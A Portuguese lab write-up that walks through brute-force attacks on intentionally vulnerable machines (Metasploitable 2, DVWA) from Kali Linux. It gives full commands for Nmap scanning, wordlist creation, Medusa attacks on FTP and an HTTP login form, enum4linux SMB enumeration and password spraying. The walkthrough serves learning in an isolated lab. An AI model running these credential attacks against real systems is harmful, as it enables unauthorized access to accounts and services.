# Brute-force
## Simulaçao de ataque Brute force usando Medusa e Kali Linux

Nessa simulação usei o Metasploitable 2 que é uma maquina virtual intencionalmente vulnerável usada para testes e também o sistema operacional Kali Linux e as ferramentas Medusa, Nmap e enum4linux.\
Após o download e a instalação fazemos a configuração do ambiente no VirtualBox a opção x para **"Placa de rede exclusiva de hospedeiro (host-only)"** criando uma rede virtual privada isolada entre a sua máquina hospedeira e as maquinas virtuais.

### 🔎 Localizando a maquina vulnerável 

No terminal do Metasploitable digitamos:
```
ip a
```
Exibe os endereços de IP e as propriedades de todas as interfaces de rede.\
Após obter o endereço de IP no Metasploitable, abrimos o terminal no Kali linux e digitamos o comando:
```
ping -c 3 xxx.xxx.xx.xxx
```
```ping``` verifica se um dispositivo está conectado a rede.

O parametro ```-c``` determina a quantidade exata de pacotes que serão enviadas antes de parar a execução automaticamente. No final é colocado o endereço de IP de nosso alvo.

### 💻 Passo 1: Força bruta em FTP 
Ao confirmar se a comunicação das duas maquinas estão funcionando prosseguimos fazendo uma verificação se o servidor FTP vulnerável usando a ferramenta **Nmap** descobrimos quais portas estão abertas. \
Estamos trabalhando em um cenário de um servidor FTP antigo.
```
nmap -sV -p 21,22,80,445,139 xxx.xxx.xx.xxx
```
Esse comando faz uma varredura nas portas indicadas mostrando se estão abertas e também mostra a versão do serviço que está rodando em cada porta, versões antigas logo são vulneráveis. 
### 📄 Passo 3: criando wordlists
No terminal do Kali linux vamos criar um arquivo txt que contém uma compilação de palavras para usuario e senhas e assim conseguir testar e acessar diretamente o FTP.
```
echo -e 'user\nmsfadmin\nadmin\nroot'> users.txt

echo -e '123456\npassword\nqwrty\nmsfadmin'> pass.txt
```
### ✴️ Passo 4: Fazendo o ataque

Agora vamos usar a ferramenta ***Medusa*** do Kali linux para realizar o ataque de força bruta.

```
medusa -h xxx.xxx.xx.xxx -U users.txt -P pass.txt -M ftp -t 6
```
* Chamamos a ferramenta medusa, definimos o host/alvo (IP do servidor) e as wordlists que vão ser testadas e por ultimo definimos a quantidade de threads/conexões simultâneas.
* Se ele aparecer a mensagem de **"SUCESS"** nas combinações a ferramenta medusa encontrou a combinação de senha e login válidas. 

### 💻 Acessando formulário web (DVWA) 

O **DVWA** é uma plataforma web desenvolvida em PHP e MySQL intencionalmente repleta de falhas de segurança, serve como um laboratório de testes seguro e legal para profissionais e estudantes.

No navegador do Kali e com o IP do alvo acesse:
```
xxx.xxx.xx.xxx/dvwa/login.php
```
### 📄 Descobrindo o acesso 
No terminal do Kali crie worldlist para usuarios possiveis
e para senhas, em seguida digite:
```
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php'\
-m FORM:'username=^USER^&password=^PASS^&login=login' \
-m 'FAIL=login failed' -t 6
```
* A primeira linha define o alvo, a lista de usuários, senhas e que o ataque vai ser via HTTP.
* A segunda linha define a página de login.
* Marcamos quais dados vão ser enviados no formulário
* Por ultimo colocamos uma mensagem de falha, se a resposta da página contiver o texto **login failed**, considere que o login falhou.

Logo após ele vai retornar quais combinações foram bem sucedidas ou não e assim conseguimos localizar a opção de login e senha de sucesso e acessar no navegador a plataforma DVWA.

## ✴️ Ataque em cadeia: Enumeração SMB e spraying

O SMB é um dispositivo ou sistema em rede responsável por hospedar, gerenciar arquivos, pastas e impressoras compartilhadas. O cenário dessa simulação é que já conseguimos acesso a uma maquina por exemplo por phishing e descobrimos o acesso a um servidor SMB ativo. \
Vamos usar a tecnica password spraying onde o invasor testa o ataque com poucas senhas e com muitos usuarios ao mesmo tempo.

## 📝 Passo 1 : Enumeração com enum4linux
 Primeiro numeramos de usuarios com enum4linux que vai interagir com o protocolo SMB, se tiver mal configurado vamos conseguir informações para o nosso ataque.
```
enum4linux -a 192.168.56.102 | tee enum4_output.txt
```
* Usamos a ferramenta Enum4linux para coletar informações de um sistema Windows/Samba através do protocolo SMB e salvar a saída em um arquivo.
* O comando comando **tee** faz duas coisas ao mesmo tempo,mostra a saída no terminal e salva a saída em um arquivo.
* Em seguida abrimos o arquivo que foi criado com o seguinte comando:
```
less enum4_output.txt
```
Assim descobrimos o nomes dos usuários alvos e podemos prosseguir criando um arquivo txt com uma lista de usuarios localizados e um segundo arquivo com senhas que geralmente são muito usadas e vulneráveis, como: password, 123456, Welcome123, msfadmin entre outras.

## ✴️ Passo 2: Fazendo o ataque

Criado os arquivos digitamos o seguinte comando no terminal:
```
medusa -h xxx.xxx.xx.xxx -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```
Nesse bloco de codigo mudamos o protocolo para smbnt, definimos o número de threads simultâneas por host e o total de tentativas.\
Ao testar localizamos a opção com a mensagem de **"SUCESS"**. \
Para testar se a opção é a correta usamos o comando:
```
smbclient -L //xxx.xxx.xx.xxx -U msfadmin
```
Testando se vamos conseguir acesso com um dos nomes do usuario encontrado no caso "msfadmin" se pedir a senha vai confirmar que é um dos usuários e assim voce pode colocar a senha encontrada anteriormente para acessar o SMB.

















